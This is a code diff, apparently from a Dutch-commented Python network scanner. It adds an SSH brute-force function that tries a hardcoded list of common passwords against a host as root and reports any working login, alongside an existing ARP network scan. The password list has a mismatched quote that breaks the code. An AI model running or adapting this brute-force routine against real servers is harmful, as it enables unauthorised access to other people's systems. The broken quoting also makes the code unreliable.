@@ -46,6 +46,7 @@ def arp_scan(target_ip="192.168.1.0/24"):
         arp = ARP(pdst=target_ip)
         ether = Ether(dst="ff:ff:ff:ff:ff:ff")
         packet = ether/arp
+
         print("[DEBUG] ARP-pakket wordt verstuurd...")
         result = srp(packet, iface=iface, timeout=5, verbose=False)[0]
 
@@ -62,7 +63,31 @@ def arp_scan(target_ip="192.168.1.0/24"):
             print(f"[+] {len(devices)} apparaten gevonden.")
     
         return devices
+
     except Exception as e:
         print(f"[-] Kritieke fout tijdens ARP-scan: {str(e)}")
         print("[+] Voer het script uit als Administrator en of controleer je firewall instellingen")
         return []
+
+def ssh_bruteforce(host, port=22, username="root", max_attempts=10):
+    """test veelvoorkomende wachtwoorden op een SSH-server"""
+    print(f"[+] SSH brute force test op {host}...")
+    common_passwords = ['admin', "password', '123456', '12345678', 'qwerty', 'abc123', 'letmein', 'welcome', 'admin123', 'root', 'toor']
+
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    tried = 0
+    for password in common_passwords:
+        try:
+            client.connect(host, port=port, username=username, password=password, timeout=3)
+            print(f"[+] Succesvolle login: {username}:{password}")
+            client.close()
+            return True
+        except:
+            tried += 1
+            if tried >= max_attempts:
+                break
+    print(f"[-] geen geldig wachtwoord of username gevonden")
+    return False
+
